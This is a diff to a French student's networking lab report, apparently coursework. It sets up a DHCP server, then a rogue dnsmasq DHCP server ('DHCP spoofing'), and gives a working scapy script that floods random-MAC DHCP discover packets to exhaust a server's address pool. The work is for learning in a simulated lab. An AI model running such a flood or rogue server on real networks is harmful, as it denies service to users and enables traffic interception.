@@ -94,3 +94,141 @@ PING google.com (216.58.214.174) 56(84) bytes of data.
 64 bytes from mad01s26-in-f174.1e100.net (216.58.214.174): icmp_seq q = 1 ttl I = 63 time 37.0 ms
 64 bytes from par10s42-in-f14.1e100.net (216.58.214.174): icmp_seq=2 ttl I = 63 time=29.4 ms
 ```
+
+**Installer et configurer un serveur DHCP**
+
+
+je me suis aidé de ce tuto https://gitlab.com/it4lik/b2-network-virt/-/blob/main/memo/rocky_network.md
+```
+dnf-y install dhcp-server
+vi /etc/dhcp/dhcpd.conf
+systemctl enable --now dhcpd
+```
+
+```
+authoritative;
+subnet 10.1.1.0 netmask 255.255.255.0 {
+	range 10.1.1.10 10.1.1.50;
+	option broadcast-address 10.1.1.1;
+	option routers 10.1.1.1;
+}
+```
+**Récupérer une IP automatiquement depuis les 3 nodes**
+
+```
+PC1> dhcp
+DORA IP 10.1.1.10/24 GW 10.1.1.1
+
+PC1> show ip
+
+NAME        : PC1[1]
+IP/MASK     : 10.1.1.10/24
+GATEWAY     : 10.1.1.1
+DNS         : 
+DHCP SERVER : 10.1.1.253
+DHCP LEASE  : 563, 570/285/498
+MAC         : 00:50:79:66:68:01
+LPORT       : 20007
+RHOST:PORT  : 127.0.0.1:20008
+MTU         : 1500
+```
+
+```
+PC2> dhcp
+DDORA IP 10.1.1.12/24 GW 10.1.1.1
+
+PC2> show ip
+
+NAME        : PC2[1]
+IP/MASK     : 10.1.1.12/24
+GATEWAY     : 10.1.1.1
+DNS         : 
+DHCP SERVER : 10.1.1.253
+DHCP LEASE  : 594, 599/299/524
+MAC         : 00:50:79:66:68:00
+LPORT       : 20009
+RHOST:PORT  : 127.0.0.1:20010
+MTU         : 1500
+```
+
+```
+PC3> dhcp
+DDORA IP 10.1.1.11/24 GW 10.1.1.1
+
+PC3> show ip
+
+NAME        : PC3[1]
+IP/MASK     : 10.1.1.11/24
+GATEWAY     : 10.1.1.1
+DNS         : 
+DHCP SERVER : 10.1.1.253
+DHCP LEASE  : 584, 599/299/524
+MAC         : 00:50:79:66:68:02
+LPORT       : 20011
+RHOST:PORT  : 127.0.0.1:20012
+MTU         : 1500
+```
+
+
+**4 DHCP spoofing**
+
+Installation de dnsmasq
+
+```
+dnf install -y dnsmasq
+```
+
+Configuration de dnsmasq
+
+```
+port=0 # pour désactiver DNS
+dhcp-range=10.1.1.210,10.1.1.250,255.255.255.0,12h
+dhcp-authoritative
+interface=enp0s3
+```
+**TEST**
+```
+PC4> dhcp
+DDORA IP 10.1.1.248/24 GW 10.1.1.50
+```
+
+```
+PC4> show ip
+
+NAME        : PC4[1]
+IP/MASK     : 10.1.1.248/24
+```
+```
+PC2> dhcp
+DDORA IP 10.1.1.246/24 GW 10.1.1.50
+```
+```
+PC3> dhcp
+DDORA IP 10.1.1.247/24 GW 10.1.1.50
+```
+```
+PC4> dhcp
+DORA IP 10.1.1.21/24 GW 10.1.1.1
+```
+
+**5 DHCP starvation**
+
+*je vais utilsier le script de cette video*  https://www.youtube.com/watch?v=VW0szfPHeo0&ab_channel=DavidBombal
+
+```
+from scapy.all import *
+
+conf.checkIPaddr = False
+
+dhcp_discover = Ether(dst='ff:ff:ff:ff:ff:ff',src=RandMAC()) \
+				/IP(src='0.0.0.0',dst='255.255.255.255') \
+				/UDP(sport=68,dport=67) \
+				/BOOTP(op=1,chaddr = RandMAC()) \
+				/DHCP(options=[('message-type','discover'),('end')])
+
+sendp(dhcp_discover,iface='wlp4s0',loop=1,verbose=1)
+```
+
+
+
+
